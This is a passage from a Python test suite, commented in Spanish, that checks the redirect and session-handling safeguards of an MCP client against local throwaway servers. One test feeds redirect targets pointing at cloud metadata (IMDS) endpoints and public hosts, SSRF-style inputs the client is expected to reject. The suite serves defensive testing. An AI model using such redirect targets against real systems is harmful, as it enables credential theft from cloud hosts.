                largo = int(self.headers.get("Content-Length", 0))
                cuerpo = self.rfile.read(largo) if largo else b""
                duenno.peticiones.append((self.path, dict(self.headers), cuerpo))
                responder(self)

            def log_message(self, *a, **k):
                pass

        self._httpd = HTTPServer(("127.0.0.1", 0), Handler)

    def __enter__(self):
        self._hilo = threading.Thread(target=self._httpd.serve_forever, daemon=True)
        self._hilo.start()
        return self

    def __exit__(self, *exc):
        self._httpd.shutdown()
        self._httpd.server_close()

    @property
    def endpoint(self):
        return "http://127.0.0.1:%d" % self._httpd.server_address[1]


def _responder_initialize(handler):
    cuerpo = json.dumps({"jsonrpc": "2.0", "id": 1,
                         "result": {"protocolVersion": "2025-03-26", "capabilities": {},
                                    "serverInfo": {"name": "efimero", "version": "0"}}}).encode()
    handler.send_response(200)
    handler.send_header("Content-Type", "application/json")
    handler.send_header("Mcp-Session-Id", "sesion-del-destino")
    handler.send_header("Content-Length", str(len(cuerpo)))
    handler.end_headers()
    handler.wfile.write(cuerpo)


def _redirector(codigo, destino):
    def _responder(handler):
        handler.send_response(codigo)
        handler.send_header("Location", destino)
        handler.send_header("Content-Length", "0")
        handler.end_headers()
    return _responder


def test_redirecciones_301_302_303_no_se_siguen(monkeypatch):
    """Gap #34d: seguir un 301/302/303 re-POSTearia el cuerpo completo a un destino no elegido.
    Solo 307/308 (que preservan el metodo) se siguen; el resto es error CITANDO la URL."""
    espia = _EspiaConexiones(monkeypatch)
    with _ServidorEfimero(_responder_initialize) as destino:
        for codigo in (301, 302, 303):
            with _ServidorEfimero(_redirector(codigo, destino.endpoint + "/mcp")) as origen:
                cliente = gr.ClienteMCP(origen.endpoint, timeout_s=2.0, allow_remote=False)
                try:
                    cliente.initialize()
                    raise AssertionError("siguio una redireccion %d" % codigo)
                except gr.ErrorMCP as e:
                    assert str(codigo) in str(e), (codigo, str(e))
                assert origen.peticiones, codigo
        assert destino.peticiones == []      # el destino de la redireccion nunca recibio nada
    assert espia.fuera_de_loopback == []


def test_la_sesion_no_cruza_esquema_host_ni_puerto(monkeypatch):
    """Gap #78 (CWE-200): `127.0.0.1:A` y `127.0.0.1:B` son servicios DISTINTOS — un 307 **ni un
    308** (los dos codigos que SI se siguen, porque preservan el metodo) puede llevarse el
    `Mcp-Session-Id` de la sesion anterior a otro puerto."""
    espia = _EspiaConexiones(monkeypatch)
    for codigo in (307, 308):
        with _ServidorEfimero(_responder_initialize) as destino:
            with _ServidorEfimero(_redirector(codigo, destino.endpoint + "/mcp")) as origen:
                cliente = gr.ClienteMCP(origen.endpoint, timeout_s=2.0, allow_remote=False)
                cliente._session_id = "sesion-del-origen"
                cliente.initialize()
            cabeceras_origen = origen.peticiones[0][1]
            cabeceras_destino = destino.peticiones[0][1]
        assert cabeceras_origen.get("Mcp-Session-Id") == "sesion-del-origen", codigo
        assert not any(k.lower() == "mcp-session-id" for k in cabeceras_destino), (codigo,
                                                                                  cabeceras_destino)
    assert espia.fuera_de_loopback == []


def test_la_sesion_tampoco_cruza_de_hostname_con_el_mismo_puerto(monkeypatch):
    """Misma terna del gap #78 aislando el HOST: `localhost` y `127.0.0.1` son el mismo destino
    fisico y el MISMO puerto, pero no el mismo origen — un 307 entre ambos tira igual la cabecera
    de sesion (el mutante «comparar solo el puerto» sobrevive sin este caso)."""
    espia = _EspiaConexiones(monkeypatch)
    peticiones = []

    def _responder(handler):
        # primer POST: redirige a SI MISMO por nombre; segundo: contesta el handshake
        peticiones.append(dict(handler.headers))
        if len(peticiones) == 1:
            _redirector(307, "http://localhost:%s/mcp" % handler.server.server_address[1])(handler)
        else:
            _responder_initialize(handler)

    with _ServidorEfimero(_responder) as servidor:
        cliente = gr.ClienteMCP(servidor.endpoint, timeout_s=5.0, allow_remote=False)
        cliente._session_id = "sesion-por-ip"
        cliente.initialize()
    # 1) initialize con la sesion vieja -> 307; 2) initialize ya SIN la sesion (otro origen);
    # 3) la `notifications/initialized` posterior, que ya lleva la sesion NUEVA del handshake.
    assert len(peticiones) >= 2, peticiones
    assert peticiones[0].get("Mcp-Session-Id") == "sesion-por-ip"
    assert not any(k.lower() == "mcp-session-id" for k in peticiones[1]), peticiones[1]
    assert espia.fuera_de_loopback == []


def test_cada_salto_de_redireccion_se_revalida_contra_el_guardarrail(monkeypatch):
    """Gaps #34e/#71: que el PRIMER salto sea loopback no autoriza el segundo — un `Location`
    hacia el IMDS (en sus cuatro formas) o hacia un host publico se rechaza en el salto, sin un
    solo `connect()` fuera de loopback."""
    espia = _EspiaConexiones(monkeypatch)
    destinos = [url for url, _ in _IMDS] + ["http://8.8.8.8:8000/mcp", "http://[::]:8000/mcp"]
    for destino in destinos:
        with _ServidorEfimero(_redirector(307, destino)) as origen:
            cliente = gr.ClienteMCP(origen.endpoint, timeout_s=2.0, allow_remote=False)
            try:
                cliente.initialize()
                raise AssertionError("siguio la redireccion hacia %s" % destino)
            except gr.HostNoPermitido:
                pass
            assert origen.peticiones, destino
    assert espia.fuera_de_loopback == []


def test_una_cadena_de_redirecciones_no_es_infinita(monkeypatch):
    """`_MAX_REDIRECCIONES`: un servidor que se redirige a si mismo no puede tener al cliente (y
    al ciclo que lo invoca) dando saltos para siempre."""
    espia = _EspiaConexiones(monkeypatch)

    def _siempre_redirige(handler):
        _redirector(307, "http://127.0.0.1:%s/mcp" % handler.server.server_address[1])(handler)

    with _ServidorEfimero(_siempre_redirige) as bucle:
        cliente = gr.ClienteMCP(bucle.endpoint, timeout_s=5.0, allow_remote=False)
        try:
            cliente.initialize()
            raise AssertionError("no corto la cadena de redirecciones")
        except gr.ErrorMCP as e:
            assert "demasiadas redirecciones" in str(e), str(e)
        # Gap #158 (Minor, fix1 Fase 4): el oraculo era `gr._MAX_REDIRECCIONES + 1`, es decir, la
        # constante del modulo MUTADO -subirla de 3 a 8 pasaba-. El tope esperado va literal.
        assert len(bucle.peticiones) == 4, (len(bucle.peticiones), gr._MAX_REDIRECCIONES)
    assert espia.fuera_de_loopback == []


def test_el_origen_de_un_salto_es_la_terna_esquema_host_puerto():
    """Gap #160 (Minor, fix1 Fase 4): el LIMITE declarado del test de sesion era que el cambio de
    ESQUEMA no lo ejercia nadie (sin TLS real no hay servidor `https` efimero). `_origen` ya es una
    funcion de modulo, asi que la terna se prueba unitariamente: dos URLs que SOLO difieren en el
    esquema son origenes distintos (mutante «terna sin esquema»: muere aqui)."""
    assert gr._origen("http://127.0.0.1:8000/mcp") != gr._origen("https://127.0.0.1:8000/mcp")
    assert gr._origen("http://127.0.0.1:8000/mcp") == gr._origen("http://127.0.0.1:8000/otra/ruta")
    assert gr._origen("http://127.0.0.1:8000/mcp") != gr._origen("http://127.0.0.1:8001/mcp")
    assert gr._origen("http://127.0.0.1:8000/mcp") != gr._origen("http://localhost:8000/mcp")
    assert gr._origen("http://[::1:8000/mcp") is None          # URL invalida: sin origen


# ============================================ 6. higiene de la propia suite (gap #166)

def test_el_servidor_mcp_falso_se_carga_una_sola_vez():
    """Gap #166: el modulo de apoyo `_mcp_fake.py` no puede quedar cargado con DOS nombres de
    modulo distintos (una copia por suite, con estado propio) bajo la invocacion unica de pytest
    que usa CI."""
    cargados = sorted(nombre for nombre, modulo in list(sys.modules.items())
                      if getattr(modulo, "__file__", None)
                      and os.path.basename(str(modulo.__file__)) == "_mcp_fake.py")
    assert cargados == ["ks_graphiti_mcp_fake"], cargados


def test_f4fix2_el_modulo_de_apoyo_mcp_es_solo_ascii():
    """Gap #168 (Important): con acentos en sus comentarios, `_mcp_fake.py` entraba en
    `SCRIPTS_CON_SIMBOLOS` de `tests/test_console_encoding.py` (criterio `es_pieza`: basename que
    no empieza por `test_`), que le exigia un modo de arranque en `MODOS` -imposible para un modulo
    de apoyo sin `__main__`- y CI se ponia en rojo (4 failed). Se elige la primera opcion del
    arbitraje: el modulo de apoyo va sin caracteres no ASCII (`es_pieza` no cambia). Mutante:
    re-acentuar un comentario -> muere aqui (y en la suite de consola)."""
    with open(os.path.join(KS_SCRIPTS, "_mcp_fake.py"), "rb") as f:
        crudo = f.read()
    no_ascii = [(n, l[:60]) for n, l in enumerate(crudo.split(b"\n"), 1) if any(c > 127 for c in l)]
    assert no_ascii == [], no_ascii
